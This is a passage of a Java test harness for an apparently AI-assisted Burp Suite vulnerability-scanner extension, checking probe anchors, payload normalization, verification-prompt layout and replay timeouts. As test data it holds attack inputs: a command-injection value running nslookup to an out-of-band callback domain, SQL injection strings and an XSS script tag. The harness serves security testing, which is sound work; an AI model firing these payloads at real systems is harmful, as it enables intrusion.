        burp.IBurpExtenderCallbacks cb = (burp.IBurpExtenderCallbacks) java.lang.reflect.Proxy.newProxyInstance(
                OASTHarness.class.getClassLoader(), new Class[]{burp.IBurpExtenderCallbacks.class},
                (proxy, method, args) -> null);
        AIEngine engine = new AIEngine(cb, null, panel, listener);
        com.zackai.model.ScanTask task = new com.zackai.model.ScanTask(7, null, "GET", "http://t/?id=1");
        task.setStatus(com.zackai.model.ScanTask.TaskStatus.SCANNING);
        task.setOriginalResponseBytes(baseline.getBytes(java.nio.charset.StandardCharsets.UTF_8));
        task.setOriginalResponseMillis(200L);

        burp.IHttpRequestResponse stub = (burp.IHttpRequestResponse) java.lang.reflect.Proxy.newProxyInstance(
                OASTHarness.class.getClassLoader(), new Class[]{burp.IHttpRequestResponse.class},
                (proxy, method, args) -> {
                    if ("getResponse".equals(method.getName())) {
                        return response.getBytes(java.nio.charset.StandardCharsets.UTF_8);
                    }
                    if ("getRequest".equals(method.getName())) {
                        return "GET /?id=1 HTTP/1.1\r\nHost: t\r\n\r\n".getBytes(java.nio.charset.StandardCharsets.UTF_8);
                    }
                    return null;
                });

        java.lang.reflect.Method m = AIEngine.class.getDeclaredMethod("processTestResult",
                com.zackai.model.ScanTask.class, burp.IHttpRequestResponse.class, int.class, int.class,
                String.class, String.class, String.class, long.class,
                Class.forName("com.zackai.core.AIEngine$OobProbe"), java.util.concurrent.atomic.AtomicInteger.class,
                java.util.Map.class, byte[].class);
        m.setAccessible(true);
        m.invoke(engine, task, stub, 1, 9, "COMMAND_INJECTION", ";nslookup oob.invalid", "id",
                elapsedMs, oobProbe(records, failure), new java.util.concurrent.atomic.AtomicInteger(),
                anchors, null);
        out.recorded = task.getVulnerabilities().size();
        if (out.vuln == null && out.recorded > 0) {
            out.vuln = task.getVulnerabilities().get(0);
        }
        out.log = logText(panel);
        return out;
    }

    /** 造一个对照锚点（{@code AIEngine.ProbeAnchor} 是私有嵌套类，只能反射） */
    static Object probeAnchor(String payload, String response, long elapsedMs, int displayIndex) throws Exception {
        Class<?> cls = Class.forName("com.zackai.core.AIEngine$ProbeAnchor");
        java.lang.reflect.Constructor<?> ctor = cls.getDeclaredConstructor(
                String.class, byte[].class, long.class, int.class);
        ctor.setAccessible(true);
        return ctor.newInstance(payload, response.getBytes(java.nio.charset.StandardCharsets.UTF_8),
                elapsedMs, displayIndex);
    }

    /** 造一个 OobProbe：records 表示带一条回连记录，failure 表示通道不可用 */
    static Object oobProbe(boolean records, boolean failure) throws Exception {
        Class<?> cls = Class.forName("com.zackai.core.AIEngine$OobProbe");
        java.lang.reflect.Constructor<?> ctor = cls.getDeclaredConstructor();
        ctor.setAccessible(true);
        Object probe = ctor.newInstance();
        setField(probe, "label", "3f9ac1d2");
        setField(probe, "domain", "7f917734.log.nat.cloudns.ph");
        if (failure) {
            setField(probe, "failure", "本次未取得回连域名（回连服务不可用）");
        }
        if (records) {
            setField(probe, "records", java.util.Arrays.asList(
                    "DNS 解析回连：3f9ac1d2.7f917734.log.nat.cloudns.ph 来自 1.2.3.4"));
        }
        return probe;
    }

    static void setField(Object target, String name, Object value) throws Exception {
        java.lang.reflect.Field f = target.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(target, value);
    }

    /** 读日志面板的全文（先冲掉 EDT 队列，否则读到的是中间状态） */
    static String logText(com.zackai.ui.LogPanel panel) throws Exception {
        java.lang.reflect.Field f = com.zackai.ui.LogPanel.class.getDeclaredField("logPane");
        f.setAccessible(true);
        final javax.swing.JTextPane pane = (javax.swing.JTextPane) f.get(panel);
        // **在 EDT 上读**：日志面板是 EDT 独占的（TaskTablePanel 那套契约），而面板自己还有个
        // 150ms 防抖重排定时器在 EDT 上跑 —— 主线程直接读会和它交错（实测会抛在
        // BasicTextUI$UpdateHandler.removeUpdate 里，整个 harness 被带走）
        final String[] text = new String[1];
        javax.swing.SwingUtilities.invokeAndWait(() -> {
            try {
                text[0] = pane.getDocument().getText(0, pane.getDocument().getLength());
            } catch (Exception e) {
                text[0] = "<读取失败: " + e + ">";
            }
        });
        return text[0];
    }

    static int payloadsOf(Object payloadResult) throws Exception {
        java.lang.reflect.Field f = payloadResult.getClass().getDeclaredField("payloads");
        f.setAccessible(true);
        return ((com.google.gson.JsonArray) f.get(payloadResult)).size();
    }

    /** 读第 index 条载荷的某个字段；没有这个字段时返回 null */
    static String payloadField(Object payloadResult, int index, String key) throws Exception {
        java.lang.reflect.Field f = payloadResult.getClass().getDeclaredField("payloads");
        f.setAccessible(true);
        com.google.gson.JsonArray arr = (com.google.gson.JsonArray) f.get(payloadResult);
        com.google.gson.JsonObject obj = arr.get(index).getAsJsonObject();
        return obj.has(key) ? obj.get(key).getAsString() : null;
    }

    /**
     * 探测载荷对照锚点。
     *
     * <p>契约里每个「参数 × 漏洞类型」组合的第 1 条是探测载荷，指南也写着它「用于建立响应差异基线」——
     * 可此前**没有任何代码读它**，而验证提示词又要求模型做「恒真 vs 恒假」这类成对判读，
     * 那两条载荷却在两次互不知情的调用里分开判。这一组断言钉住三件事：
     * <ol>
     *   <li>锚点的位置键必须与 paramVulnMap **同一套别名口径** —— 键对不上就是静默失效：</li>
     *   <li>{@code kind} 字段能穿过 normalizeStep3Response（重建对象只拷三个键，不搬就等于丢掉）；</li>
     *   <li>对照块只在真的有对照时出现，措辞里必须写明它不是基线。</li>
     * </ol>
     */
    static void checkProbeAnchor() throws Exception {
        AIEngine engine = new AIEngine(null, null, new LogPanel(), null);
        java.nio.charset.Charset utf8 = java.nio.charset.StandardCharsets.UTF_8;
        byte[] req = ("POST /a HTTP/1.1\r\nHost: t\r\nCookie: JSESSIONID=x\r\nContent-Type: application/json\r\n\r\n"
                + "{\"id\":1}").getBytes(utf8);

        // ① 位置键的别名口径（与 mappedParamsOf 保持一致）
        java.lang.reflect.Method posKey = AIEngine.class.getDeclaredMethod("anchorPositionKey", String.class, byte[].class);
        posKey.setAccessible(true);
        Object cookieKey = posKey.invoke(null, "header:Cookie", req);
        check("Cookie 家族的三种写法落到同一个锚点键（否则 Shiro 的组合配不上对照）",
                cookieKey.equals(posKey.invoke(null, "rememberMe", req))
                        && cookieKey.equals(posKey.invoke(null, "cookie", req))
                        && cookieKey.equals(posKey.invoke(null, "JSESSIONID", req)),
                "cookie 族键不一致：" + cookieKey + " / " + posKey.invoke(null, "rememberMe", req));
        check("URL_PATH[1] 与 URL_PATH 落到同一个键",
                posKey.invoke(null, "URL_PATH[1]", req).equals(posKey.invoke(null, "URL_PATH", req)),
                "url_path 族键不一致");
        check("普通参数位置按大小写无关归一（与 paramVulnMap 同一口径）",
                posKey.invoke(null, "ID", req).equals(posKey.invoke(null, "id", req)), "大小写没归一");
        check("空位置返回空键（调用方据此跳过，而不是记一个假对照）",
                "".equals(posKey.invoke(null, "  ", req)), "空位置没返回空键");

        java.lang.reflect.Method comboKey = AIEngine.class.getDeclaredMethod(
                "comboAnchorKey", String.class, String.class, byte[].class);
        comboKey.setAccessible(true);
        check("漏洞类型也归一：SQL_INJECTION 与 SQL注入 落到同一个组合键",
                comboKey.invoke(engine, "id", "SQL_INJECTION", req)
                        .equals(comboKey.invoke(engine, "id", "SQL注入", req)),
                "类型没归一：" + comboKey.invoke(engine, "id", "SQL_INJECTION", req)
                        + " / " + comboKey.invoke(engine, "id", "SQL注入", req));

        // ② kind 穿过 normalizeStep3Response
        java.lang.reflect.Method norm = AIEngine.class.getDeclaredMethod("normalizeStep3Response",
                String.class, List.class, byte[].class, java.util.Set.class);
        norm.setAccessible(true);
        Object withKind = norm.invoke(engine,
                "{\"testPayloads\":[{\"type\":\"SQL注入\",\"payload\":\"1' AND '1'='1\",\"position\":\"id\","
                        + "\"kind\":\"probe\",\"wafBypass\":false}]}",
                List.of("id"), null, new java.util.LinkedHashSet<>(List.of("id")));
        check("kind 穿过 normalizeStep3Response 仍在（重建对象只拷三个键，不搬就丢）",
                "probe".equals(payloadField(withKind, 0, "kind")), "kind 丢了");
        Object junkKind = norm.invoke(engine,
                "{\"testPayloads\":[{\"type\":\"SQL注入\",\"payload\":\"1\",\"position\":\"id\","
                        + "\"kind\":\"探测\",\"wafBypass\":false}]}",
                List.of("id"), null, new java.util.LinkedHashSet<>(List.of("id")));
        check("kind 写成中文时既不丢载荷也不当标记（宽容是刻意的）",
                payloadsOf(junkKind) == 1 && payloadField(junkKind, 0, "kind") == null, "垃圾 kind 干扰了载荷取舍");
        Object noKind = norm.invoke(engine,
                "{\"testPayloads\":[{\"type\":\"SQL注入\",\"payload\":\"1\",\"position\":\"id\",\"wafBypass\":false}]}",
                List.of("id"), null, new java.util.LinkedHashSet<>(List.of("id")));
        check("kind 缺失时载荷照常保留（识别对照靠顺序，kind 只用来否决）",
                payloadsOf(noKind) == 1 && payloadField(noKind, 0, "kind") == null, "缺 kind 的载荷被丢了");

        // ③ 对照块本身
        java.lang.reflect.Method block = AIEngine.class.getDeclaredMethod("buildProbeAnchorBlock",
                Class.forName("com.zackai.core.AIEngine$ProbeAnchor"), int.class, byte[].class);
        block.setAccessible(true);
        check("没有对照 → 整块不出现（提示词与没有这个功能时逐字节相同）",
                "".equals(block.invoke(engine, null, -1, null)), "空对照却吐出了内容");
        Object anchor = probeAnchor("1' AND '1'='2", "HTTP/1.1 200 OK\r\nDate: aaa\r\n\r\nno rows", 213L, 0);
        String text = (String) block.invoke(engine, anchor, -1,
                "HTTP/1.1 200 OK\r\nDate: bbb\r\n\r\none row".getBytes(utf8));
        check("对照块带上对照载荷原文与耗时", text.contains("1' AND '1'='2") && text.contains("213"), text);
        check("对照块写明「不是基线」（否则模型会拿参照物当判据）", text.contains("不是基线"), "");
        check("对照块里有代码算出来的「同/不同」结论，不让模型自己数",
                text.contains("本次响应与对照"), "");
        // 对照载荷的文本窗口与四段正文同宽（VERIFY_WINDOW）：300 字符的载荷应当**原样全给** ——
        // 模型要拿它跟【测试Payload】对照着看，而后者是原样全给的，两边完整度必须一致
        String midPayload = "A".repeat(300);
        String midText = (String) block.invoke(engine, probeAnchor(midPayload, "HTTP/1.1 200 OK\r\n\r\nno rows", 1L, 0),
                -1, "HTTP/1.1 200 OK\r\n\r\nx".getBytes(utf8));
        check("300 字符的对照载荷原样进入提示词（与【测试Payload】同样完整）",
                midText.contains(midPayload), "被截断了");
        // 超长时走 capWindow 截断：截断标记必须是它自己的，而不是 loggablePayload 里那句 i18n 文案
        //（"…（共 N 字符）"）—— 提示词里禁止出现 Msg.*
        String hugeText = (String) block.invoke(engine, probeAnchor("A".repeat(12000),
                "HTTP/1.1 200 OK\r\n\r\nno rows", 1L, 0), -1, "HTTP/1.1 200 OK\r\n\r\nx".getBytes(utf8));
        check("超长对照载荷用 capWindow 截断，没有把 i18n 文案带进提示词",
                hugeText.contains("已截断") && !hugeText.contains("…（共 "),
                hugeText.substring(0, Math.min(120, hugeText.length())));
        // 两个 Date 的值长度相同（真实 Date 就是定长的），只差内容 → 掩码后应当判「相同」
        String sameText = (String) block.invoke(engine, anchor, -1,
                "HTTP/1.1 200 OK\r\nDate: zzz\r\n\r\nno rows".getBytes(utf8));
        check("与对照只差易变响应头时，结论写「逐字节相同」（Date 不算差异）",
                sameText.contains("逐字节相同"), sameText.replace("\r\n", "\\r\\n"));

        // ④ 提示词里的位置：本次响应 → 对照块 → 基线块；没有对照就不出现
        java.lang.reflect.Method userPrompt = AIEngine.class.getDeclaredMethod("buildVerifyUserPrompt",
                com.zackai.model.ScanTask.class, String.class, String.class, long.class,
                Class.forName("com.zackai.core.AIEngine$OobProbe"), String.class, byte[].class,
                Class.forName("com.zackai.core.AIEngine$ProbeAnchor"));
        userPrompt.setAccessible(true);
        byte[] resp = "HTTP/1.1 200 OK\r\n\r\none row".getBytes(utf8);
        String prompt = (String) userPrompt.invoke(engine, null, "1' AND '1'='1", "SQL_INJECTION", 200L,
                null, "GET /?id=1", resp, anchor);
        // 注意不能拿 "基线" 两字判顺序：对照块自己的文案里就写着「它不是基线」，会匹配到块内
        check("对照块排在【本次测试响应】之后、基线块之前",
                prompt.indexOf("本次测试响应") < prompt.indexOf("同组合探测载荷")
                        && prompt.indexOf("同组合探测载荷") < prompt.indexOf("原始请求的响应（基线"),
                "顺序不对");
        String noControlPrompt = (String) userPrompt.invoke(engine, null, "1' AND '1'='1", "SQL_INJECTION", 200L,
                null, "GET /?id=1", resp, null);
        check("没有对照时提示词里不出现对照块", !noControlPrompt.contains("同组合探测载荷"), "多出了对照块");

        // ⑤ 四段窗口：常量与行为都要对上（旧值是 4000/8000/4000，9000 字符的响应会被截掉）
        java.lang.reflect.Field win = AIEngine.class.getDeclaredField("VERIFY_WINDOW");
        win.setAccessible(true);
        int window = (Integer) win.get(null);
        check("四段窗口统一为 10000（与步骤2 同量级）", window == 10000, "实际 " + window);
        String bigResp = "R".repeat(12000);
        String bigPrompt = (String) userPrompt.invoke(engine, null, "1' AND '1'='1", "SQL_INJECTION", 200L,
                null, "GET /?id=1", bigResp.getBytes(utf8), null);
        check("超过窗口的响应被标注截断（窗口确实生效）", bigPrompt.contains("原文共 12000 字符"),
                "没标注：" + bigPrompt.substring(bigPrompt.lastIndexOf("…（")));
        String midResp = "R".repeat(9000);
        String midPrompt = (String) userPrompt.invoke(engine, null, "1' AND '1'='1", "SQL_INJECTION", 200L,
                null, "GET /?id=1", midResp.getBytes(utf8), null);
        check("9000 字符的响应整体进入提示词（旧的 8000 窗口会把它截掉）",
                !midPrompt.contains("原文共"), "被截了");

        // ⑥ 易变响应头不再把锚点带到 Date 那一行
        java.lang.reflect.Method anchorOf = AIEngine.class.getDeclaredMethod("evidenceAnchor",
                String.class, String.class, byte[].class);
        anchorOf.setAccessible(true);
        byte[] dateBase = "HTTP/1.1 200 OK\r\nDate: Tue, 27 Sep 2026 12:00:01 GMT\r\n\r\nhello world".getBytes(utf8);
        check("只有 Date 不同 → 没有可锚定的差异（不再锚在第 40 来个字符的 Date 头上）",
                ((Integer) anchorOf.invoke(null,
                        "HTTP/1.1 200 OK\r\nDate: Tue, 27 Sep 2026 12:00:59 GMT\r\n\r\nhello world",
                        "zzz-not-in-response", dateBase)) == -1,
                "锚到了 " + anchorOf.invoke(null,
                        "HTTP/1.1 200 OK\r\nDate: Tue, 27 Sep 2026 12:00:59 GMT\r\n\r\nhello world",
                        "zzz-not-in-response", dateBase));
        check("正文真的不同 → 锚在正文的首个不同处",
                ((Integer) anchorOf.invoke(null,
                        "HTTP/1.1 200 OK\r\nDate: Tue, 27 Sep 2026 12:00:59 GMT\r\n\r\nhello WORLD",
                        "zzz-not-in-response", dateBase)) > 40,
                "锚点落回了 Date 头");

        // ⑦ 探测载荷指南不能再推荐「同时是证明载荷」的取值。
        // 这个断言比较弱（只钉住那句禁止性措辞在不在），但足以拦住把旧清单改回去 ——
        // 旧清单里 Struts2 的第 1 条就是 %{100*100}、SSTI 是 {{7*7}}、命令注入是 id/whoami，
        // 三个都是「发出去就等于证据」的形态，与「对照必须无害」直接冲突
        Class<?> modeCls = Class.forName("com.zackai.model.ScanTask$ScanMode");
        java.lang.reflect.Method safeGuide = AIEngine.class.getDeclaredMethod(
                "getSafePayloadGuideForVulnType", modeCls);
        safeGuide.setAccessible(true);
        for (String mode : new String[]{"STRUTS2", "SSTI", "COMMAND_INJECTION"}) {
            String guide = (String) safeGuide.invoke(engine,
                    Enum.valueOf((Class<Enum>) modeCls.asSubclass(Enum.class), mode));
            check(mode + " 的探测载荷明确禁止了「会产生证据」的取值（它们是强证据，会让对照带毒）",
                    guide.contains("不要放"), guide);
        }

        // ⑧ 记录与取用（载荷循环里的接线，静默失效都发生在这里）
        java.lang.reflect.Method record = AIEngine.class.getDeclaredMethod("recordProbeAnchor",
                java.util.Map.class, String.class, String.class, byte[].class, String.class,
                burp.IHttpRequestResponse.class, long.class, int.class, String.class);
        record.setAccessible(true);
        java.lang.reflect.Method find = AIEngine.class.getDeclaredMethod("findProbeAnchor",
                java.util.Map.class, String.class, String.class, byte[].class, int.class);
        find.setAccessible(true);
        java.util.Map<String, Object> anchors = new java.util.HashMap<String, Object>();
        record.invoke(engine, anchors, "id", "SQL_INJECTION", req, "1' AND '1'='2", stubResponse("AAAA"), 100L, 1, "probe");
        check("记下之后，同组合的后一条载荷取得到对照",
                find.invoke(engine, anchors, "id", "SQL注入", req, 4) != null, "取不到");
        record.invoke(engine, anchors, "id", "SQL_INJECTION", req, "attack-1", stubResponse("BBBB"), 100L, 2, "attack");
        check("后到的载荷不会顶掉先记的对照（对照是该组合第一条）",
                "1' AND '1'='2".equals(anchorPayload(find.invoke(engine, anchors, "id", "SQL注入", req, 9))),
                "被覆盖成了 " + anchorPayload(find.invoke(engine, anchors, "id", "SQL注入", req, 9)));
        check("本条载荷自己不做自己的对照",
                find.invoke(engine, anchors, "id", "SQL_INJECTION", req, 1) == null, "拿自己当对照了");
        check("别的组合取不到这个对照（键里带类型）",
                find.invoke(engine, anchors, "id", "XSS", req, 5) == null, "串到别的类型去了");
        java.util.Map<String, Object> vetoed = new java.util.HashMap<String, Object>();
        record.invoke(engine, vetoed, "q", "XSS", req, "<script>alert(1)</script>", stubResponse("AAAA"), 100L, 1, "attack");
        check("明确标了 attack 的载荷不被当作对照（否则是误报生成器）", vetoed.isEmpty(),
                "还是记了 " + vetoed.size() + " 条");
        java.util.Map<String, Object> noBody = new java.util.HashMap<String, Object>();
        record.invoke(engine, noBody, "id", "SQL_INJECTION", req, "1", stubResponse(null), 100L, 1, "probe");
        check("没拿到响应的载荷不记对照（空字节当对照 = 把一切都判成有差异）", noBody.isEmpty(),
                "记了 " + noBody.size() + " 条");
    }

    /**
     * 步骤1 的重放也要限时。以前只有步骤4 的载荷有看门狗，重放是裸调 `makeHttpRequest` ——
     * 目标不响应时任务会一直卡到 Burp 自己的超时（默认可达分钟级），日志上只有一行
     * 「正在发送原始请求到目标...」，看起来就是卡死了。
     *
     * <p>用一个**卡住 5 秒不返回**的假 Burp 来验证「到点真的会走」：窗口给 300 毫秒，
     * 断言它远早于 5 秒就返回 null（不是等假 Burp 睡醒）。
     */
    static void checkStep1ReplayTimeout() throws Exception {
        burp.IBurpExtenderCallbacks slow = (burp.IBurpExtenderCallbacks) java.lang.reflect.Proxy.newProxyInstance(
                OASTHarness.class.getClassLoader(), new Class[]{burp.IBurpExtenderCallbacks.class},
                (proxy, method, args) -> {
                    if ("makeHttpRequest".equals(method.getName())) {
                        Thread.sleep(5000);          // 模拟一个不响应的目标：Burp 这里会一直阻塞
                        return null;
                    }
                    return null;
                });
        AIEngine engine = new AIEngine(slow, null, new LogPanel(), null);
        java.lang.reflect.Method replay = AIEngine.class.getDeclaredMethod("replayWithTimeout",
                burp.IHttpService.class, byte[].class, long.class);
        replay.setAccessible(true);
        long start = System.currentTimeMillis();
        Object result = replay.invoke(engine, null,
                "GET / HTTP/1.1\r\nHost: t\r\n\r\n".getBytes(java.nio.charset.StandardCharsets.UTF_8), 300L);
        long took = System.currentTimeMillis() - start;
        check("步骤1 重放卡住时到点就放弃（不再等 Burp 自己的超时）",
                result == null && took < 3000, "用了 " + took + " ms，返回 " + result);
    }

    /** 只实现 getResponse 的 IHttpRequestResponse 桩 */
    static burp.IHttpRequestResponse stubResponse(String body) {
        return (burp.IHttpRequestResponse) java.lang.reflect.Proxy.newProxyInstance(
                OASTHarness.class.getClassLoader(), new Class[]{burp.IHttpRequestResponse.class},
                (proxy, method, args) -> "getResponse".equals(method.getName())
                        ? (body == null ? null : body.getBytes(java.nio.charset.StandardCharsets.UTF_8))
                        : null);
    }

    /** 读对照锚点里的载荷原文（ProbeAnchor 是私有嵌套类） */
    static String anchorPayload(Object anchor) throws Exception {
        if (anchor == null) return null;
        java.lang.reflect.Field f = anchor.getClass().getDeclaredField("payload");
        f.setAccessible(true);
        return (String) f.get(anchor);
    }
}
